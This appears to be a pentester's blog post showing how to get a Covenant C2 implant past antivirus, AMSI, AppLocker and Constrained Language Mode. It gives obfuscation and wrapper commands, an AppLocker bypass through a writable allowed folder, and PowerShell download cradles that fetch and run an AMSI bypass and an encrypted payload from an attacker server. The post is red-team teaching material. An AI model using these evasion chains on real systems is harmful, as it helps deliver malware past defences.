---
layout: post
title: Sailing Past Security Measures In AD
---

Today we´re going to talk a little about possible ways to circumvent some of the security measures one might face during an engagement in an Active Directory.  

We as pentesters are heavily relying on our tools like [Bloodhound](https://github.com/BloodHoundAD/BloodHound), [Rubeus](https://github.com/GhostPack/Rubeus), [Mimikatz](https://github.com/gentilkiwi/mimikatz) and all the other fancy stuff. Be it for an internal assessment or a Red Team campaign.  

But the Blue Team is not at sleep, trying to keep the bad guys outside with their newest *AI machine learning cyber tools*, to keep the bad guys outside.  

![broken]({{ site.baseurl }}/images/2021-16-01/nopass.jpg "meme")

So how can we safely run our tools?  
How are we able to bypass AV?  
What can be done against AppLocker?  
What about PowerShell´s ConstrainedLanguage Mode?  
AMSI who?  

## Introduction  

During pentests or Red Team assessments, it all comes down to our beloved toolbox, containing all the usefull and naughty stuff of a pentester´s every day life. 
The problem to us is that there are two kind of people outside there. The first group is abusing these tools to carry out attacks on governments, companies and people, and the second group is trying to keep up with the first group by developing and implementing detection mechanisms and countermeasures to defend the bad guys.  

In order to proof to our customers how good (or bad) they are at playing the defender game, we take the role of the attackers, mimicing their behaviour, toolsets and techniques, and see how far we can get.  

This blog-post will be all about (*at least some of*) the tools and tactics we can use to stay under the radar and have our software stay untouched from AV and co.

So let´s consider an on-site pentest. We arrive at the customer, pull out our sticker-bombed laptop to impress the IT-guys, and are handed over credentials for a low priv domain-account and eventually a domain joined test-machine from which we can start our work.  

The next thing is we will most likely want to gather some intel, so we copy our Rubeus.exe to the thumbdrive and plug it into the test-machine.  

BAMMM - deleted!

![broken]({{ site.baseurl }}/images/2021-16-01/rubeus_deleted.png "ciao rubeus")

*Ciao Rubeus, nice to have met you.*  
AV flagged our tool because it is known to do harmful stuff, and the bad guys tend to abuse it´s functionalities.  

Well that´s just one of the possible situations you might run into. So let´s walk through some of the ones I faced during my work and (mostly) learning times in the next sections of this blog-post.  

## Bypassing AV  

If we consider traditional anti virus software (and even today they work like this - at least in parts), they all have some kind of database which contains like hashes of known malicious files, strings that are known the be in evil software (hello *sekurlsa::logoncredentials*) and so on. These are updated as soon as the vendor is able to spot new threats and sold as Threat Intel.  
So when ever AV is able to investigate filebased actions e.g. when you open a file and AV hooks in and does a check of the content inside, it will perform it´s tasks to evaluate what it sees against its database, and as a result will give you thumbs up or down.  

So our option here is obvious:  
Everything you use out of the box will sooner or later get flagged by the AV vendors by integrating according detection mechanisms into their database.  
That´s where obfuscation comes into play. If you haven´t done so already, I highly recommend you take your time to read through some of [s3cur3th1sh1t´s](https://twitter.com/ShitSecure) [blog posts](https://s3cur3th1ssh1t.github.io) related to this topic.  

Obfuscation can be as simple as doing string replacements or as complex as encrypting whole binaries that unfold at runtime.  

### String replacement  

Let´s take the following default code snippet from [cobbr´s](https://twitter.com/cobbr_io) [Covenant](https://github.com/cobbr/Covenant) Grunt stager payload:  
```
namespace GruntStager
{
    public class GruntStager
    {
        public GruntStager()
        {
            ExecuteStager();
```
You can bet your ass that if some kind of AV sees the string ```GruntStager``` it will fall into havoc.  
Having that code in our VisualStudio we can highlight the string we want to replace and hit ```ctrl + r``` and type the new name to rename it throughout the whole project. We will also apply this to the public class and all other suspicious sounding parts we find and will eventually end up with something like this:

![broken]({{ site.baseurl }}/images/2021-16-01/stager_rename.png "rename")

What we can also do is concatenating strings instead of replacing them. So that ```GruntStager``` becomes ```'Gru'+'ntS'+'ta'+'ger'```.  
In several cases this is enough to fool AV if done properly.  

A usefull tool that comes in handy when you want to test your new code against Windows Defender or AMSI signatures is [Raste Mouse´s](https://twitter.com/_RastaMouse)[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It will basically split your code into chunks of specific length and test it against the database of Windows Defender or AMSI, and tell you where in your code it gets flagged.

![broken]({{ site.baseurl }}/images/2021-16-01/ThreatCheck.png "ThreatCheck")   

There are tools out there, that will do the obfuscation job for you. Feel free to have a look at the [obfuscation section](https://github.com/LuemmelSec/Pentest-Tools-Collection#obfuscation) of my github repo, or just do some creative googling.  

### Wrapping and decrypting code  

If you are actively following the InfoSec community on twitter, you will most probably stumble upon [byt3bl33d3r´s](https://twitter.com/byt3bl33d3r) [Offensive Nim repo](https://github.com/byt3bl33d3r/OffensiveNim). These templates let you wrap your C# executable inside Nim and be compiled as C executable, thus hiding your content. Together with [s3cur3th1sh1t](https://twitter.com/ShitSecure) they even developed it further, so that you can have a decrypted payload inside the Nim binary, and have it decrypted at runtime in memory. This will make it way harder to impossible to reverse, if you have to put your files to disk, as decompiling will only reveal the encrypted C# stuff. To learn more on this you can check out [Playing-with-OffensiveNim](https://s3cur3th1ssh1t.github.io/Playing-with-OffensiveNim/).  

There are also tools like [amber](https://github.com/EgeBalci/amber) or [PEzor](https://github.com/phra/PEzor), which will take C or C++ executables and reflectively load them into memory, adding some nice features like delayed execution too fool in memory scanners or avoiding AV user-land hooks and stuff. I don´t understand even half of the things that are going on here. But if you want to know more read [phra´s](https://twitter.com/phraaaaaaa) [blog](https://iwantmore.pizza/posts/PEzor.html) regarding PEZor.  

All the above mentioned methods can possibly help you obfuscate your code, so you don´t have to deploy the out of the box tools.  
But be aware that by the time also the wrapper code will get flagged. I did a test with a simple ```hello world``` C executable wrapped with PEZor, and I got like 21 hits on VirusTotal.
By now you should know what to do :) Obfuscate the wrappers.  

### Not touching the disk  

Another approach is to try to not touch the disk with our malicious content, so that traditional AV is not able to catch us when reading or writing data.  
The most well known technique to me is to use PowerShell´s Invoke Expression feature. It will allow you to download a script from a remote source and execute it in memory.  
```
iex(new-object net.webclient).downloadstring('http://10.55.0.30/grunt.ps1')
```  

Another possibility is to use [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) from - *who would have thought it* - S3cur3Th1sSh1t, to load and execute C# directly into memory.  
    
Okay so let´s bypass Defender by not touching the disk and put our default Grunt payload directly into memory:

![broken]({{ site.baseurl }}/images/2021-16-01/ASMI_catch.png "AMSI Catch")  

*Fuck! Something went wrong. Looks like we got catched by AMSI which detected a Covenant payload.*  

We bypassed the signature based part of Defender for the filesystem stuff, but AMSI checked our script when we loaded it to memory, handed it over to Defender who then found the suspicious strings, flagging it as malicious.  

If you would like to know more about how AMSI works - read this [post](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/) about AMSI and how to bypass it.  

We can verify that it was AMSI by issuing ~~one of the random bypasses from [amsi.fail](https://amsi.fail)~~ the [AMSI bypass for C# from Rasta Mouse](https://github.com/rasta-mouse/AmsiScanBufferBypass) and see it working afterwards with all the Defender features still turned on:  

![broken]({{ site.baseurl }}/images/2021-16-01/CSharp_AMSI_bypass.png "bypass")  
![broken]({{ site.baseurl }}/images/2021-16-01/CSharp_AMSI_bypass_grunt.png "bypass")  

I failed hard for several times with all the [amsi.fail](https://amsi.fail) bypasses for the Grunt payload. Talking to my boss (*you know the guy with the l33t name containing sh1t and stuff*) it turns out that for C# payloads - the 2nd stage of the Grunt payload which is C# - you need to have a bypass for C#. Holy moly, but that´s how it is. Thank you sir.   

### Chaining the tricks 

For obvious reasons I played with Nim, Invoke-SharpLoader, PEZor and all the other crazy stuff.  
My attempts to combine the parts to chain a stealthy attack resulted in two approaches that look like the following:  

#### Grunt.exe -> Nim Wrapper -> PEZor -> local execution 

Just to try to avoid local detection when copied to disk.   

1. Create Grunt.exe  
   ![broken]({{ site.baseurl }}/images/2021-16-01/Create_Grunt_exe.png "create Grunt")  

2. Convert Grunt.exe to Nim byte array  
   ```
   CSharpToNimByteArray -inputfile .\GruntHTTP.exe
   ```
   ![broken]({{ site.baseurl }}/images/2021-16-01/Convert_Grunt_to_array.png "convert to byte array")   

3. Paste the byte array into the C# loader [template](https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/execute_assembly_bin.nim) and build the C    executable  
   ```
   nim c --passL:-Wl,--dynamicbase,--export-all-symbols .\LoadCSharp.nim
   ```

4. Wrap the C executable into PEZor  
   ```
   PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=10 /root/Desktop/Grunt_Nim.exe -z 2
   ```
   ![broken]({{ site.baseurl }}/images/2021-16-01/Building_PEZor.png "PEZor build")  

5. Deploy  
   ![broken]({{ site.baseurl }}/images/2021-16-01/Covenant_PEZor_run.png "PEZor run")  

   *Tada - Grunt incoming*  
   ![broken]({{ site.baseurl }}/images/2021-16-01/Covenant_PEZor_success.png "PEZor success")  

#### AppLocker & Constrained language bypass -> Powershell load script -> AMSI bypass -> Invoke-SharpLoader -> Encrypted Grunt

If there wasn´t the AppLocker bypass needed, one could also run this completely from remote, i.e. in a phishing campaign starting with a .htm file or something liek this, which runs our loader script.  
The whole attack is carried out on a low priv account.  

1. Identify a way to bypass AppLocker and ConstrainedLanguage  

   ![broken]({{ site.baseurl }}/images/2021-16-01/everything_blocked.png  "All blocked")

   To check the current PS language mode we can run:  
   ```
   $ExecutionContext.SessionState.LanguageMode
   ```  

   We can issue the following PS cmdlet to identify all AppLocker policies in place:  
   ```
   Get-ApplockerPolicy -Effective -xml > c:\users\luemmel\Desktop\applocker.xml
   ```  

   ![broken]({{ site.baseurl }}/images/2021-16-01/applocker_allow_dll.png  "Allow dll")

   We can see that the **Everyone** group is allowed to run stuff from *C:\Program Files (x86)\hMailServer\\*\*

   We can further check the ACLs on that folder with the following PS cmdlet:  
   ```
   Get-Acl -path 'C:\Program Files (x86)\hMailServer\' | fl
   ```  

   ![broken]({{ site.baseurl }}/images/2021-16-01/acl_users_allowed.png  "Allowed users ACL")

   Which shows us that the **Users** group has write access to that specific folder. *Perfect - someone fucked up here :)*  

2. Bypass AppLocker and ConstrainedLanguage  
  
   So now that we know how - let´s get our hands dirty.  

   Compile [PowerShdll](https://github.com/p3nt4/PowerShdll) and copy to client to **C:\Program Files (x86)\hMailServer\\*\* and run it:  
   ```
   rundll32 'C:\Program Files (x86)\hMailServer\PowerShdll.dll',main -w
   ```  

   ![broken]({{ site.baseurl }}/images/2021-16-01/powershdll_popped.png  "PowerShdll popped")

3. Prepare Invoke-SharpLoader  

    Encrypt our default Grunt.exe    
    ```
    . .\Invoke-SharpEncrypt.ps1  
    Invoke-SharpEncrypt -file C:\Tools_manual\nim-1.4.2\examples\Offensive\GruntHTTP.exe -password LuemmelSec -outfile C:\users\Luemmel\Desktop\Grunt_SharpLoader.enc  
    ``` 

    ![broken]({{ site.baseurl }}/images/2021-16-01/sharpencrypt.png  "sharpencrypt")

    Host the encrypted file on our Covenant server under ```Listeners -> listener -> Hosted Files -> + Create```

    Adapt the Invoke-SharpLoader script to have it directly run it with our encrypted payload by adding this to the last line:  
    ```
    Invoke-SharpLoader -location http://10.55.0.30/Grunt_SharpLoader.enc -password LuemmelSec -noArgs
    ```

    ![broken]({{ site.baseurl }}/images/2021-16-01/adapt_isl.png  "sharpencrypt")

    And host this file as well on our Covenant server under i.e. /Invoke-SharpLoader  

4. Execute our Powershell load script 
    In the last step we put together a short script that we can call from our PowerShdll which looks like this:  
    ```
    iex(new-object net.webclient).downloadstring('http://10.55.0.30/amsibypass');
    iex(new-object net.webclient).downloadstring('http://10.55.0.30/Invoke-SharpLoader');
    ```
    Remeber AMSI is still in place here, so we need to bypass it - even inside PowerShdll. Luckily for us, Invoke-Sharploader has a integrated C# and ETW bypass, so we just take care for the normal PowerShell AMSI bypass.  

    Upload to our Covenant server under /init.  

    *Guns loaded - give em hell*  

    ![broken]({{ site.baseurl }}/images/2021-16-01/guns_fired.png  "guns fired")
    ![broken]({{ site.baseurl }}/images/2021-16-01/grunt_incoming.png  "incoming")
    ![broken]({{ site.baseurl }}/images/2021-16-01/grunt_executes.png  "executing")

    As you can see Defender would really like to upload our sample for further analysis but - nahhhh.

### Conclusion  

